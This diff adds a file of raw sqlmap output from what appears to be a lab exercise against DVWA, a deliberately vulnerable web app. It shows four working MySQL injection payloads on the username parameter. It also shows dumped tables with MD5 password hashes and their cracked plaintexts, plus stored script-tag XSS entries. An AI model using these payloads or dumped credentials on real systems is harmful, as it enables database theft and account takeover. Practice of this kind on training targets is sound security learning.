@@ -1,0 +1,92 @@
+sqlmap identified the following injection point(s) with a total of 174 HTTP(s) requests:
+---
+Parameter: username (GET)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: username=Submit' RLIKE (SELECT (CASE WHEN (5893=5893) THEN 0x5375626d6974 ELSE 0x28 END))-- osAD&password=Submit&Login=Login
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: username=Submit' AND (SELECT 8393 FROM(SELECT COUNT(*),CONCAT(0x716a767871,(SELECT (ELT(8393=8393,1))),0x71766b7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- vQTm&password=Submit&Login=Login
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=Submit' AND (SELECT 9916 FROM (SELECT(SLEEP(5)))hGoY)-- ivSL&password=Submit&Login=Login
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 8 columns
+    Payload: username=Submit' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716a767871,0x747078536b516e784d434c52484c676b445a4270686a64476950616366684f6b717452544f456642,0x71766b7871),NULL,NULL#&password=Submit&Login=Login
+---
+web server operating system: Linux Debian 9 (stretch)
+web application technology: Apache 2.4.25
+back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+Database: dvwa
+Table: guestbook
+[3 entries]
++------------+------------------------------+------------------------------+
+| comment_id | name                         | comment                      |
++------------+------------------------------+------------------------------+
+| 1          | <script>alert('hi')</script> | <script>alert('hi')</script> |
+| 2          | <script>alert('hi')</script> | <script>alert('hi')</script> |
+| 3          | <script>alert('hi')</script> | <script>alert('hi')</script> |
++------------+------------------------------+------------------------------+
+
+Database: dvwa
+Table: users
+[5 entries]
++---------+---------+-----------------------------+---------------------------------------------+-----------+------------+---------------------+--------------+
+| user_id | user    | avatar                      | password                                    | last_name | first_name | last_login          | failed_login |
++---------+---------+-----------------------------+---------------------------------------------+-----------+------------+---------------------+--------------+
+| 1       | admin   | /hackable/users/admin.jpg   | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | admin     | admin      | 2023-01-18 19:28:15 | 0            |
+| 2       | gordonb | /hackable/users/gordonb.jpg | e99a18c428cb38d5f260853678922e03 (abc123)   | Brown     | Gordon     | 2023-01-18 19:28:15 | 0            |
+| 3       | 1337    | /hackable/users/1337.jpg    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  | Me        | Hack       | 2023-01-18 19:28:15 | 0            |
+| 4       | pablo   | /hackable/users/pablo.jpg   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  | Picasso   | Pablo      | 2023-01-18 19:28:15 | 0            |
+| 5       | smithy  | /hackable/users/smithy.jpg  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | Smith     | Bob        | 2023-01-18 19:28:15 | 0            |
++---------+---------+-----------------------------+---------------------------------------------+-----------+------------+---------------------+--------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (GET)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: username=Submit' RLIKE (SELECT (CASE WHEN (5893=5893) THEN 0x5375626d6974 ELSE 0x28 END))-- osAD&password=Submit&Login=Login
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: username=Submit' AND (SELECT 8393 FROM(SELECT COUNT(*),CONCAT(0x716a767871,(SELECT (ELT(8393=8393,1))),0x71766b7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- vQTm&password=Submit&Login=Login
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=Submit' AND (SELECT 9916 FROM (SELECT(SLEEP(5)))hGoY)-- ivSL&password=Submit&Login=Login
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 8 columns
+    Payload: username=Submit' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716a767871,0x747078536b516e784d434c52484c676b445a4270686a64476950616366684f6b717452544f456642,0x71766b7871),NULL,NULL#&password=Submit&Login=Login
+---
+web server operating system: Linux Debian 9 (stretch)
+web application technology: Apache 2.4.25
+back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+Database: dvwa
+Table: users
+[5 entries]
++---------+---------+-----------------------------+---------------------------------------------+-----------+------------+---------------------+--------------+
+| user_id | user    | avatar                      | password                                    | last_name | first_name | last_login          | failed_login |
++---------+---------+-----------------------------+---------------------------------------------+-----------+------------+---------------------+--------------+
+| 1       | admin   | /hackable/users/admin.jpg   | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | admin     | admin      | 2023-01-18 19:28:15 | 0            |
+| 2       | gordonb | /hackable/users/gordonb.jpg | e99a18c428cb38d5f260853678922e03 (abc123)   | Brown     | Gordon     | 2023-01-18 19:28:15 | 0            |
+| 3       | 1337    | /hackable/users/1337.jpg    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  | Me        | Hack       | 2023-01-18 19:28:15 | 0            |
+| 4       | pablo   | /hackable/users/pablo.jpg   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  | Picasso   | Pablo      | 2023-01-18 19:28:15 | 0            |
+| 5       | smithy  | /hackable/users/smithy.jpg  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | Smith     | Bob        | 2023-01-18 19:28:15 | 0            |
++---------+---------+-----------------------------+---------------------------------------------+-----------+------------+---------------------+--------------+
+
+Database: dvwa
+Table: guestbook
+[3 entries]
++------------+------------------------------+------------------------------+
+| comment_id | name                         | comment                      |
++------------+------------------------------+------------------------------+
+| 1          | <script>alert('hi')</script> | <script>alert('hi')</script> |
+| 2          | <script>alert('hi')</script> | <script>alert('hi')</script> |
+| 3          | <script>alert('hi')</script> | <script>alert('hi')</script> |
++------------+------------------------------+------------------------------+
+
